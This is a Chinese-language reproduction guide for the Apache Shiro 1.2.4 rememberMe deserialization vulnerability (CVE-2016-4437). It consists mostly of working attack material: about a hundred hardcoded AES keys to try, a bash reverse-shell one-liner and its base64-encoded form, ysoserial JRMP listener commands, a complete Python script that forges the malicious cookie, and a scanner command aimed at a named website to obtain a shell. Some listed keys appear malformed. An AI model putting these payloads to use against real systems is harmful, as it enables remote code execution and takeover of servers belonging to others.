<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2016-4437）Apache Shiro 1.2.4 反序列化漏洞</h1><h2>一、漏洞简介</h2><p>Apache shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值--&gt;Base64解码--&gt;AES解密--&gt;反序列化。<br />然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p><h2>二、漏洞影响</h2><p>Apache Shiro &lt;=1.2.4</p><h2>三、复现过程</h2><h3>收集到的key</h3><p>kPH+bIxk5D2deZiIxcaaaA==<br />4AvVhmFLUs0KTA3Kprsdag==<br />Z3VucwAAAAAAAAAAAAAAAA==<br />fCq+/xW488hMTCD+cmJ3aQ==<br />0AvVhmFLUs0KTA3Kprsdag==<br />1AvVhdsgUs0FSA3SDFAdag==<br />1QWLxg+NYmxraMoxAXu/Iw==<br />25BsmdYwjnfcWmnhAciDDg==<br />2AvVhdsgUs0FSA3SDFAdag==<br />3AvVhmFLUs0KTA3Kprsdag==<br />3JvYhmBLUs0ETA5Kprsdag==<br />r0e3c16IdVkouZgk1TKVMg==<br />5aaC5qKm5oqA5pyvAAAAAA==<br />5AvVhmFLUs0KTA3Kprsdag==<br />6AvVhmFLUs0KTA3Kprsdag==<br />6NfXkC7YVCV5DASIrEm1Rg==<br />6ZmI6I2j5Y+R5aSn5ZOlAA==<br />cmVtZW1iZXJNZQAAAAAAAA==<br />7AvVhmFLUs0KTA3Kprsdag==<br />8AvVhmFLUs0KTA3Kprsdag==<br />8BvVhmFLUs0KTA3Kprsdag==<br />9AvVhmFLUs0KTA3Kprsdag==<br />OUHYQzxQ/W9e/UjiAGu6rg==<br />a3dvbmcAAAAAAAAAAAAAAA==<br />aU1pcmFjbGVpTWlyYWNsZQ==<br />bWljcm9zAAAAAAAAAAAAAA==<br />bWluZS1hc3NldC1rZXk6QQ==<br />bXRvbnMAAAAAAAAAAAAAAA==<br />ZUdsaGJuSmxibVI2ZHc9PQ==<br />wGiHplamyXlVB11UXWol8g==<br />U3ByaW5nQmxhZGUAAAAAAA==<br />MTIzNDU2Nzg5MGFiY2RlZg==<br />L7RioUULEFhRyxM7a2R/Yg==<br />a2VlcE9uR29pbmdBbmRGaQ==<br />WcfHGU25gNnTxTlmJMeSpw==<br />OY//C4rhfwNxCQAQCrQQ1Q==<br />5J7bIJIV0LQSN3c9LPitBQ==<br />f/SY5TIve5WWzT4aQlABJA==<br />bya2HkYo57u6fWh5theAWw==<br />WuB+y2gcHRnY2Lg9+Aqmqg==<br />kPv59vyqzj00x11LXJZTjJ2UHW48jzHN<br />3qDVdLawoIr1xFd6ietnwg==<br />ZWvohmPdUsAWT3=KpPqda<br />YI1+nBV//m7ELrIyDHm6DQ==<br />6Zm+6I2j5Y+R5aS+5ZOlAA==<br />2A2V+RFLUs+eTA3Kpr+dag==<br />6ZmI6I2j3Y+R1aSn5BOlAA==<br />SkZpbmFsQmxhZGUAAAAAAA==<br />2cVtiE83c4lIrELJwKGJUw==<br />fsHspZw/92PrS3XrPW+vxw==<br />XTx6CKLo/SdSgub+OPHSrw==<br />sHdIjUN6tzhl8xZMG3ULCQ==<br />O4pdf+7e+mZe8NyxMTPJmQ==<br />HWrBltGvEZc14h9VpMvZWw==<br />rPNqM6uKFCyaL10AK51UkQ==<br />Y1JxNSPXVwMkyvES/kJGeQ==<br />lT2UvDUmQwewm6mMoiw4Ig==<br />MPdCMZ9urzEA50JDlDYYDg==<br />xVmmoltfpb8tTceuT5R7Bw==<br />c+3hFGPjbgzGdrC+MHgoRQ==<br />ClLk69oNcA3m+s0jIMIkpg==<br />Bf7MfkNR0axGGptozrebag==<br />1tC/xrDYs8ey+sa3emtiYw==<br />ZmFsYWRvLnh5ei5zaGlybw==<br />cGhyYWNrY3RmREUhfiMkZA==<br />IduElDUpDDXE677ZkhhKnQ==<br />yeAAo1E8BOeAYfBlm4NG9Q==<br />cGljYXMAAAAAAAAAAAAAAA==<br />2itfW92XazYRi5ltW0M2yA==<br />XgGkgqGqYrix9lI6vxcrRw==<br />ertVhmFLUs0KTA3Kprsdag==<br />5AvVhmFLUS0ATA4Kprsdag==<br />s0KTA3mFLUprK4AvVhsdag==<br />hBlzKg78ajaZuTE0VLzDDg==<br />9FvVhtFLUs0KnA3Kprsdyg==<br />d2ViUmVtZW1iZXJNZUtleQ==<br />yNeUgSzL/CfiWw1GALg6Ag==<br />NGk/3cQ6F5/UNPRh8LpMIg==<br />4BvVhmFLUs0KTA3Kprsdag==<br />MzVeSkYyWTI2OFVLZjRzZg==<br />CrownKey==a12d/dakdad<br />empodDEyMwAAAAAAAAAAAA==<br />A7UzJgh1+EWj5oBFi+mSgw==<br />YTM0NZomIzI2OTsmIzM0NTueYQ==<br />c2hpcm9fYmF0aXMzMgAAAA==<br />i45FVt72K2kLgvFrJtoZRw==<br />U3BAbW5nQmxhZGUAAAAAAA==<br />ZnJlc2h6Y24xMjM0NTY3OA==<br />Jt3C93kMR9D5e8QzwfsiMw==<br />MTIzNDU2NzgxMjM0NTY3OA==<br />vXP33AonIp9bFwGl7aT7rA==<br />V2hhdCBUaGUgSGVsbAAAAA==<br />Z3h6eWd4enklMjElMjElMjE=<br />Q01TX0JGTFlLRVlfMjAxOQ==<br />ZAvph3dsQs0FSL3SDFAdag==<br />Is9zJ3pzNh2cgTHB4ua3+Q==<br />NsZXjXVklWPZwOfkvk6kUA==<br />GAevYnznvgNCURavBhCr1w==<br />66v1O8keKNV3TTcGPK1wzg==<br />SDKOLKn2J1j/2BHjeZwAoQ==</p><h3>bash 转码地址</h3><h5>http://www.jackson-t.ca/runtime-exec-payloads.html</h5><p>bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1</p><p>1.png</p><h2>姿势一</h2><h3>在vps上开启rmi注册表服务</h3><p>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}'</p><p>4.png</p><h3>生成payload</h3><p>python exploit.py vps:1099</p><p>5.png<br /><strong>exploit.py</strong></p><p>import sys<br />import uuid<br />import base64<br />import subprocess<br />from Crypto.Cipher import AES<br />def encode_rememberme(command):<br />    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'JRMPClient', command], stdout=subprocess.PIPE)<br />    BS = AES.block_size<br />    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()<br />    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")<br />    iv = uuid.uuid4().bytes<br />    encryptor = AES.new(key, AES.MODE_CBC, iv)<br />    file_body = pad(popen.stdout.read())<br />    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br />    return base64_ciphertext<br /><br /><br />if __name__ == '__main__':<br />    payload = encode_rememberme(sys.argv[1])    <br />print "rememberMe={0}".format(payload.decode())</p><h3>nc监听</h3><p>nc -lvvp 8888</p><h3>使用burp发送生成好的payload</h3><p>6.png</p><h3>获取到shell</h3><p>7.png</p><h2>姿势二 【实战测试中，可能会有部分网站无法成功】</h2><h3>poc</h3><h5>https://github.com/ianxtianxt/ShiroScan</h5><p><strong>首先我们在服务器中进行监听</strong></p><p>nc -lvvp 1234</p><p><strong>执行poc进行反弹shell</strong></p><p>python3 shiro.py https://www.0-sec.org "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}"</p><p>2.png</p><p><strong>获取到shell</strong><br />3.png</p></body></html>